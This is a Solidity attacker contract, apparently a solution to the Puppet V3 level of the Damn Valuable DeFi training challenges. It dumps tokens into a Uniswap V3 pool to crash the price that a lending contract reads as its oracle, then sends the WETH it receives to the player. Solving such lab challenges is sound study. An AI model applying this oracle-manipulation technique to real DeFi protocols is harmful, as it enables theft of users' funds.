// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract PuppetAttacker {
    IUniswapV3Pool uniswapPool;
    DamnValuableToken token;
    IUniswapV3Factory uniswapFactory;
    WETH weth;
    address player;

    uint24 constant FEE = 3000;
    uint160 MIN_SQRT_RATIO = 4295128739; // sqrtPriceX96 at the minimum tick

    constructor(
        IUniswapV3Factory _uniswapFactory,
        DamnValuableToken _token,
        WETH _weth,
        address _player
    ) {
        uniswapFactory = _uniswapFactory;
        token = _token;
        weth = _weth;
        player = _player;

        uniswapPool = IUniswapV3Pool(
            uniswapFactory.getPool(address(weth), address(token), FEE)
        );
    }

    function attack(uint256 amount) public {
        token.approve(address(uniswapPool), type(uint256).max);
        uniswapPool.swap(
            address(this), // recipient
            address(token) < address(weth), // zeroForOne
            int256(amount), // amountSpecified
            MIN_SQRT_RATIO + 1, // For token → WETH swap (sqrtPriceLimitX96)
            "0x" // data
        );

        weth.transfer(player, weth.balanceOf(address(this)));
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256,
        bytes calldata
    ) external {
        if (amount0Delta > 0) {
            token.transfer(msg.sender, uint256(amount0Delta));
        }
    }
}
